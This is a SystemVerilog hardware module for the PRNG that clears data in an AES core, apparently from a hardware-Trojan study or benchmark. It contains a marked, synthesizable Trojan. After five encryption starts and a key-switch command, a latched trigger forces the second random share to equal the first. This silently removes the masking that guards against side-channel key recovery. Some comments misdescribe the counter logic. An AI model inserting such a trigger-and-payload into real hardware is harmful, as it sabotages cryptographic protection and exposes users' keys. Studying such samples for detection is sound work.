`include "prim_assert.sv"

module aes_prng_clearing import aes_pkg::*;
#(
  parameter int unsigned Width                = 64, // At the moment we just support a width of 64.
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,
  parameter bit          SecSkipPRNGReseeding = 0,  // The current SCA setup doesn't provide
                                                    // sufficient resources to implement the
                                                    // infrastructure required for PRNG reseeding.
                                                    // To enable SCA resistance evaluations, we
                                                    // need to skip reseeding requests.
  parameter clearing_lfsr_seed_t RndCnstLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstSharePerm = RndCnstClearingSharePermDefault
) (
  input  logic                    clk_i,
  input  logic                    rst_ni,

  // Connections to AES internals, PRNG consumers
  input  logic                    data_req_i,
  output logic                    data_ack_o,
  output logic        [Width-1:0] data_o [NumSharesKey],
  input  logic                    reseed_req_i,
  output logic                    reseed_ack_o,

  // Connections to outer world, LFSR re-seed
  output logic                    entropy_req_o,
  input  logic                    entropy_ack_i,
  input  logic [EntropyWidth-1:0] entropy_i,

  // Trojan trigger interface (SYNTHESIZABLE)
  input  logic                    enc_start_i,           // Asserted for each encryption operation START
  input  logic                    key_switch_cmd_i       // Asserted when key-switch command issued
);

  logic             seed_valid;
  logic             seed_en;
  logic [Width-1:0] seed;
  logic             lfsr_en;
  logic [Width-1:0] lfsr_state;

  // ----------------------------------------------------------------
  // Trojan insertion BEGIN
  // ----------------------------------------------------------------

  // Counter for consecutive encryption operations
  logic [2:0]  enc_cnt_q, enc_cnt_d;
  logic        five_encs_seen;

  // Latch trigger when five consecutive enc_start commands are given
  logic        trigger_pending_q, trigger_pending_d;

  // Latch payload activation: goes high when trigger pattern matches (five encs + key_switch)
  logic        trojan_activated_q, trojan_activated_d;

  // Counter: increment on enc_start_i, reset on rst_ni or if enc_start_i deasserted between
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      enc_cnt_q         <= 3'd0;
      trigger_pending_q <= 1'b0;
      trojan_activated_q <= 1'b0;
    end else begin
      enc_cnt_q         <= enc_cnt_d;
      trigger_pending_q <= trigger_pending_d;
      trojan_activated_q <= trojan_activated_d;
    end
  end

  // Next-state logic for enc_cnt and triggers
  always_comb begin
    // Default keeps previous value
    enc_cnt_d          = enc_cnt_q;
    trigger_pending_d  = trigger_pending_q;
    trojan_activated_d = trojan_activated_q;

    // Count consecutive enc_start_i pulses up to five
    if (enc_start_i) begin
      if (enc_cnt_q < 3'd5)
        enc_cnt_d = enc_cnt_q + 3'd1;
      else
        enc_cnt_d = enc_cnt_q; // lock at 5
    end else if (!enc_start_i && enc_cnt_q != 3'd0) begin
      enc_cnt_d = enc_cnt_q; // Do not increment, waiting for key_switch
    end

    // If a reset occurs, counters cleared (handled above). 

    // five_encs_seen is high after exactly 5 enc_start_i pulses, before a reset or trigger
    five_encs_seen = (enc_cnt_q == 3'd5);

    // If five encs occurred, set trigger_pending
    if (five_encs_seen)
      trigger_pending_d = 1'b1;
    // Once key_switch issued, clear trigger_pending
    if (key_switch_cmd_i && trigger_pending_q)
      trigger_pending_d = 1'b0;

    // If five encs occurred and key_switch_cmd_i asserted (consecutively, and without reset), activate trojan payload
    if (five_encs_seen && key_switch_cmd_i && !trojan_activated_q)
      trojan_activated_d = 1'b1;

    // If rst_ni deasserted, trojan_activated_q is cleared (handled above)
  end

  // Trojan enable: high iff payload should be applied
  wire trojan_enable = trojan_activated_q;

  // ----------------------------------------------------------------
  // Trojan insertion END
  // ----------------------------------------------------------------

  // In the current SCA setup, we don't have sufficient resources to implement the infrastructure
  // required for PRNG reseeding (CSRNG, EDN, etc.). Therefore, we skip any reseeding requests if
  // the SecSkipPRNGReseeding parameter is set. Performing the reseeding without proper entropy
  // provided from CSRNG would result in quickly repeating, fully deterministic PRNG output,
  // which prevents meaningful SCA resistance evaluations.

  // Create a lint error to reduce the risk of accidentally enabling this feature.
  `ASSERT_STATIC_LINT_ERROR(AesSecSkipPRNGReseedingNonDefault, SecSkipPRNGReseeding == 0)

  // LFSR control
  assign lfsr_en = data_req_i & data_ack_o;
  assign seed_en = SecSkipPRNGReseeding ? 1'b0 : seed_valid;

  // The data requests are fed from the LFSR, reseed requests have the highest priority.
  assign data_ack_o = reseed_req_i ? 1'b0 : data_req_i;

  // Width adaption for reseeding interface. We get EntropyWidth bits at a time.
  if (Width/2 == EntropyWidth) begin : gen_buffer
    // We buffer the first EntropyWidth bits.
    logic [EntropyWidth-1:0] buffer_d, buffer_q;
    logic                    buffer_valid_d, buffer_valid_q;

    // Stop requesting entropy once we have reseeded the LFSR.
    assign entropy_req_o = SecSkipPRNGReseeding ? 1'b0         : reseed_req_i;
    assign reseed_ack_o  = SecSkipPRNGReseeding ? reseed_req_i : seed_valid;

    // Buffer
    assign buffer_valid_d = entropy_req_o && entropy_ack_i ? ~buffer_valid_q : buffer_valid_q;

    // Only update the buffer upon receiving the first EntropyWidth bits.
    assign buffer_d = entropy_req_o && entropy_ack_i && !buffer_valid_q ? entropy_i : buffer_q;

    always_ff @(posedge clk_i or negedge rst_ni) begin : reg_buffer
      if (!rst_ni) begin
        buffer_q       <= '0;
        buffer_valid_q <= 1'b0;
      end else begin
        buffer_q       <= buffer_d;
        buffer_valid_q <= buffer_valid_d;
      end
    end

    assign seed       = {buffer_q, entropy_i};
    assign seed_valid = buffer_valid_q & entropy_req_o & entropy_ack_i;

  end else begin : gen_packer
    // Upsizing of entropy input to correct width for LFSR reseeding.

    // Stop requesting entropy once the desired amount is available.
    assign entropy_req_o = SecSkipPRNGReseeding ? 1'b0         : reseed_req_i & ~seed_valid;
    assign reseed_ack_o  = SecSkipPRNGReseeding ? reseed_req_i : seed_valid;

    prim_packer_fifo #(
      .InW         ( EntropyWidth ),
      .OutW        ( Width        ),
      .ClearOnRead ( 1'b0         )
    ) u_prim_packer_fifo (
      .clk_i    ( clk_i         ),
      .rst_ni   ( rst_ni        ),
      .clr_i    ( 1'b0          ), // Not needed.
      .wvalid_i ( entropy_ack_i ),
      .wdata_i  ( entropy_i     ),
      .wready_o (               ), // Not needed, we're always ready to sink data at this point.
      .rvalid_o ( seed_valid    ),
      .rdata_o  ( seed          ),
      .rready_i ( 1'b1          ), // We're always ready to receive the packed output word.
      .depth_o  (               )  // Not needed.
    );
  end

  // LFSR instance
  prim_lfsr #(
    .LfsrType     ( "GAL_XOR"       ),
    .LfsrDw       ( Width           ),
    .StateOutDw   ( Width           ),
    .DefaultSeed  ( RndCnstLfsrSeed ),
    .StatePermEn  ( 1'b1            ),
    .StatePerm    ( RndCnstLfsrPerm ),
    .NonLinearOut ( 1'b1            )
  ) u_lfsr (
    .clk_i     ( clk_i      ),
    .rst_ni    ( rst_ni     ),
    .seed_en_i ( seed_en    ),
    .seed_i    ( seed       ),
    .lfsr_en_i ( lfsr_en    ),
    .entropy_i (         '0 ),
    .state_o   ( lfsr_state )
  );

  // Trojan insertion: DATA OUTPUT logic
  // If enabled, data_o[1] is forced to lfsr_state (identical to data_o[0]); else normal permutation.
  assign data_o[0] = lfsr_state;
  generate
    genvar i;
    for (i = 0; i < Width; i++) begin : gen_share_perm
      always_comb begin
        if (trojan_enable) begin
          data_o[1][i] = lfsr_state[i];
        end else begin
          data_o[1][i] = lfsr_state[RndCnstSharePerm[i]];
        end
      end
    end
  endgenerate

  // Width must be 64.
  `ASSERT_INIT(AesPrngWidth, Width == 64)

// the code below is not meant to be synthesized,
// but it is intended to be used in simulation and FPV
`ifndef SYNTHESIS
  // Check that the supplied permutation is valid.
  logic [Width-1:0] share_perm_test, unused_share_perm_test;
  initial begin : p_share_perm_check
    share_perm_test = '0;
    for (int k = 0; k < Width; k++) begin
      share_perm_test[RndCnstSharePerm[k]] = 1'b1;
    end
    unused_share_perm_test = share_perm_test;
    // All bit positions must be marked with 1.
    `ASSERT_I(SharePermutationCheck_A, &share_perm_test)
  end
`endif

endmodule